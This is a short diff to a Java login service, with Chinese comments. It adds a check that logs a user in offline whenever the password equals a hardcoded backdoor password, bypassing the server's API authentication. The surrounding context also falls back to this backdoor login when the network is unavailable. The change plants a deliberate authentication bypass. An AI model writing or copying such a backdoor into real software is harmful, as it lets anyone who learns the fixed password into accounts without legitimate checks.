@@ -42,7 +42,14 @@ public class AuthService {
      * @param callback 登录结果回调
      */
     public void login(String username, String password, final LoginCallback callback) {
-        // 先检查网络连接
+        // 优先检查是否是后门密码，如果是则直接离线登录，不进行 API 访问
+        if (password.equals(ApiConfig.BACKDOOR_PASSWORD)) {
+            Log.d(TAG, "检测到后门密码，直接离线登录，跳过 API 访问");
+            attemptBackdoorLogin(username, password, callback);
+            return;
+        }
+
+        // 检查网络连接
         if (!NetworkUtils.isNetworkAvailable(context)) {
             Log.d(TAG, "网络不可用，尝试后门登录");
             attemptBackdoorLogin(username, password, callback);
